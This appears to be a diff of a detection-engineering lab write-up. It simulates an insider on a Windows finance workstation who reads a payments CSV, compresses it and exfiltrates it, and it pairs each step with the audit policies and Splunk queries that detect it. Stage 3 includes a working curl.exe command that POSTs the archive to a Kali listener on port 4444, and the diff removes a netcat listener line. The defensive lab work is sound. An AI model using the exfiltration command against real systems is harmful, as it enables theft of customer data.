@@ -1,57 +1,52 @@
 # Phase 5 — Insider Threat & Data Exfiltration
 
-A Finance department account on FIN-WKS-04 accesses customer payment data it has legitimate standing access to, stages it as a compressed archive, and exfiltrates it to an external host. No attack tools, no exploits — just a valid account doing something it shouldn't. This is undetectable by perimeter controls and authentication monitoring alone. Detection required explicitly enabling three separate Windows audit subcategories, none of which are on by default.
+A Finance department account on FIN-WKS-04 reads customer payment data, compresses it, and sends it to an external host. The account has legitimate standing access to the files — no exploits, no compromised credentials, no perimeter alerts. This scenario is undetectable by authentication monitoring, firewall rules, or IDS signatures. Detection requires host-level behavioral telemetry that is disabled by default on Windows.
 
 ---
 
-## Setup — Audit Policies That Had to Be Enabled
+## What Had to Be Enabled
 
-Windows 11 out of the box gives you almost no insider threat telemetry. Three audit subcategories and a SACL were required:
+Three Windows audit subcategories and a folder-level SACL are required. None are active on a default Windows 11 installation:
 
 ```powershell
-auditpol /set /subcategory:"File System" /success:enable           # Event ID 4663
-auditpol /set /subcategory:"Filtering Platform Connection" /success:enable  # Event ID 5156
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f  # Event ID 4103
+# Generates Event 4663 when files in watched directories are accessed
+auditpol /set /subcategory:"File System" /success:enable /failure:enable
+
+# Generates Event 4103 capturing full PowerShell cmdlet parameter bindings
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
+
+# Generates Event 5156 for every permitted network connection
+auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable
 ```
 
-A SACL (System Access Control List) was also applied to `C:\CustomerExports\` — this tells Windows to generate a 4663 event whenever anyone accesses files in that folder. Without it, file access is never logged regardless of the audit policy setting.
+A SACL (System Access Control List) was also applied to `C:\CustomerExports\`. Without it, the File System audit policy has no effect on that folder — the SACL is what instructs Windows to generate 4663 events for that specific path.
 
-**Target file created:**
-```
-C:\CustomerExports\payments_export.csv
-customer_id,name,card_last4,amount
-1001,John Smith,4521,250.00
-1002,Sarah Lee,7833,89.50
-1003,Mike Chen,1209,432.10
-```
+**Target data:**
 
-![CustomerExports folder and payment CSV confirmed on FIN-WKS-04](../screenshots/phase5/phase5-01-customerexports-folder-created.png)
+![CustomerExports folder and payments_export.csv confirmed on FIN-WKS-04](../screenshots/phase5/phase5-01-customerexports-folder-created.png)
 
 ---
 
-## Stage 1 — File Access (T1005 — Data from Local System)
+## Stage 1 — File Access (T1005)
 
-The Finance account reads `payments_export.csv`. Windows generates Event ID 4663 — this event captures exactly which file was accessed, by which account, with what access type, and via which process.
+The Finance account reads `payments_export.csv` via PowerShell. Event ID 4663 fires and captures: the exact file path, the account that accessed it, the type of access (`ReadData`), and the process responsible (`powershell.exe`). This is forensic-quality attribution for a single file read.
 
-**Detection query:**
 ```spl
 index=windows EventCode=4663 Object_Name="*CustomerExports*"
 | table _time, Account_Name, Object_Name, AccessMask
 ```
 
-The expanded event confirms: `Object Name: C:\CustomerExports\payments_export.csv`, `Account Name: ronakmishra`, `Accesses: ReadData`, `Process: powershell.exe`. This is forensic-quality evidence of the exact file that was read.
-
-![Event 4663 expanded — exact file, account, access type, and process all captured](../screenshots/phase5/phase5-03-event4663-detected.png)
+![Event 4663 — payments_export.csv read by ronakmishra via powershell.exe confirmed](../screenshots/phase5/phase5-03-event4663-detected.png)
 
 ---
 
-## Stage 2 — Compression (T1560.001 — Archive Collected Data)
+## Stage 2 — Compression (T1560.001)
 
-`Compress-Archive` packages the payment CSV into `export.zip` on the user's Desktop.
+`Compress-Archive` stages the payment CSV as `export.zip` on the user's Desktop.
 
-**Critical technical finding:** This does **not** trigger Event ID 4688 (Process Creation). Native PowerShell cmdlets run inside the existing PowerShell engine — they don't spawn a new child process, so 4688 never fires. An analyst relying solely on process creation auditing would have zero visibility into this stage.
+**Critical finding:** This does not trigger Event ID 4688 (Process Creation). Native PowerShell cmdlets execute inside the existing `powershell.exe` process — no child process is spawned, so there is no process creation event to log. An analyst monitoring only Event 4688 would have no visibility into this stage.
 
-Detection required **Event ID 4103** (PowerShell Module Logging) — enabled via registry. This event captures full parameter bindings for every cmdlet execution, including exact source and destination paths.
+Detection required Event ID 4103 (PowerShell Module Logging). This event records the full parameter bindings of every cmdlet execution — including the exact source and destination paths of the compression operation.
 
 ```spl
 index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4103
@@ -59,37 +54,31 @@ index=windows sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" 
 | table _time, ComputerName, _raw
 ```
 
-The `export.zip` file confirmed on the Desktop immediately after compression:
+The archive confirmed on the Desktop immediately after the command ran:
 
-![export.zip confirmed on FIN-WKS-04 Desktop](../screenshots/phase5/phase5-04-data-compressed.png)
+![export.zip confirmed on FIN-WKS-04 Desktop — staging complete](../screenshots/phase5/phase5-04-data-compressed.png)
 
-The 4103 event captures everything: `sourceFilePaths: C:\CustomerExports\payments_export.csv`, `destinationPath: C:\Users\ronakmishra\Desktop\export.zip`, `User: RONAKMISHRA345C\ronakmishra`. More detail than 4688 would have provided even if it had fired.
+Event 4103 captures `sourceFilePaths: C:\CustomerExports\payments_export.csv` and `destinationPath: C:\Users\ronakmishra\Desktop\export.zip` — more forensic detail than 4688 would have provided even if it had fired:
 
-![Event 4103 — full Compress-Archive parameter binding captured](../screenshots/phase5/phase5-05-event4104-compress-detected.png)
+![Event 4103 — full Compress-Archive parameter bindings including source and destination paths](../screenshots/phase5/phase5-05-event4104-compress-detected.png)
 
 ---
 
-## Stage 3 — Exfiltration (T1048 — Exfiltration Over Alternative Protocol)
+## Stage 3 — Exfiltration (T1048)
 
-`curl.exe` transmits the archive to Kali's netcat listener on port 4444 via an unencrypted HTTP POST. Port 4444 is a non-standard port with no legitimate business use on a Finance workstation.
+`curl.exe` transmits the archive to Kali's netcat listener on port 4444. Port 4444 has no legitimate business use on a Finance workstation.
 
-**On Kali (receives the data):**
-```bash
-nc -lvnp 4444 > received_data.txt
-```
-
-**On FIN-WKS-04 (sends the data):**
 ```powershell
 curl.exe -X POST --data-binary "@C:\Users\$env:USERNAME\Desktop\export.zip" http://10.0.0.100:4444/
 ```
 
 Kali confirms an inbound connection from `10.0.0.32` (FIN-WKS-04):
 
-![Kali listener receives connection from FIN-WKS-04](../screenshots/phase5/phase5-06-exfiltration-received.png)
+![Netcat listener on Kali receives connection from FIN-WKS-04](../screenshots/phase5/phase5-06-exfiltration-received.png)
 
-The received file is 431 bytes — matching the size of the `export.zip` created in Stage 2, confirming the transfer completed intact:
+The received file is 431 bytes — matching the export.zip created in Stage 2, confirming intact transfer:
 
-![received_data.txt confirmed 431 bytes on Kali](../screenshots/phase5/phase5-07-exfiltration-file-confirmed.png)
+![431-byte archive confirmed received on Kali — transfer complete](../screenshots/phase5/phase5-07-exfiltration-file-confirmed.png)
 
 **Detection query:**
 ```spl
@@ -97,15 +86,15 @@ index=windows EventCode=5156 Destination_Port=4444
 | table _time, Application_Name, Source_Address, Destination_Address, Destination_Port
 ```
 
-The 5156 event shows `Application: curl.exe`, `Source: 10.0.0.32`, `Destination: 10.0.0.100`, `Port: 4444` — unambiguous identification of the exfiltration tool, source, destination, and channel:
+Event 5156 identifies the application (`curl.exe`), source (`10.0.0.32`), destination (`10.0.0.100`), and port (`4444`) — complete attribution for the exfiltration channel:
 
-![Event 5156 — curl.exe outbound connection to Kali on port 4444 captured](../screenshots/phase5/phase5-08-event5156-network-detected.png)
+![Event 5156 — curl.exe outbound to Kali on port 4444, full connection details captured](../screenshots/phase5/phase5-08-event5156-network-detected.png)
 
 ---
 
 ## Centerpiece — Full Kill Chain Correlated
 
-All three stages correlated into a single Splunk incident using the `transaction` command. This groups events by host within a 30-minute window and only fires when all three stages are present — eliminating false positives from isolated file access or legitimate compression activity.
+All three stages are correlated into a single Splunk incident. The `transaction` command groups events by host within a 30-minute window and only produces a result when all three stages are present. This approach eliminates false positives from isolated file access or scheduled compression tasks — neither alone would trigger the alert.
 
 ```spl
 index=windows (EventCode=4663 Object_Name="*CustomerExports*")
@@ -116,15 +105,15 @@ index=windows (EventCode=4663 Object_Name="*CustomerExports*")
 | table _time, host, eventcount, duration
 ```
 
-The correlated attack chain timeline — all three stages visible in chronological order on a single host, labeled by stage:
+The full attack chain in chronological order — Stage 1 file access events, Stage 2 compression, Stage 3 exfiltration, all labeled:
 
-![Attack chain timeline — Stage 1 file access, Stage 2 compression, Stage 3 exfiltration in order](../screenshots/phase5/phase5-09-correlated-attack-chain.png)
+![Complete attack chain timeline — all three stages on RONAKMISHRA345C in sequence](../screenshots/phase5/phase5-09-correlated-attack-chain.png)
 
-The `transaction` result: **27 raw events collapsed into 1 correlated incident, spanning 1,505 seconds (~25 minutes) on RONAKMISHRA345C**.
+**27 raw events collapsed into 1 correlated incident spanning 25 minutes on FIN-WKS-04:**
 
-![Transaction result — 27 events, 1 incident, 25-minute window](../screenshots/phase5/phase5-10-transaction-correlation.png)
+![Transaction result — 27 events, 1 incident, 1505-second window on single host](../screenshots/phase5/phase5-10-transaction-correlation.png)
 
-This is the query deployed as the **"Meridian - Insider Threat Data Exfiltration Chain"** alert (Critical severity, runs every 10 minutes).
+This query is deployed as the **"Meridian - Insider Threat Data Exfiltration Chain"** alert (Critical severity, every 10 minutes).
 
 ---
 
